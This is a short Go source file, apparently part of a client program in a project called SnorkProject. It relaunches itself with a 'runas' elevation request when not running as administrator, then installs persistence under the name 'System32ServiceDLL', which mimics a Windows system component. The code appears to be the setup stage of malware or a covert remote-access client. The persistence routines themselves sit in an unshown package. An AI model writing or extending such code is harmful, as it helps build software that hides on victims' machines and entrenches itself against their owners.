package main

import (
	"log"
	"os"

	"github.com/nb-322/SnorkProject/internal/client"
	"golang.org/x/sys/windows"
)

func platformSetup() {
	name := "System32ServiceDLL"
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}

	if !client.IsAdmin() {
		err := windows.ShellExecute(
			0,
			windows.StringToUTF16Ptr("runas"),
			windows.StringToUTF16Ptr(exePath),
			nil,
			nil,
			windows.SW_NORMAL,
		)
		if err != nil {
			os.Exit(1)
		}
		os.Exit(0)
	}

	if client.CheckPersistence(name) != nil {
		err := client.CreatePersistence(name)
		if err != nil {
			log.Println(err)
			return
		}
		_ = client.SetPersistenceFlag(name)

	}

}
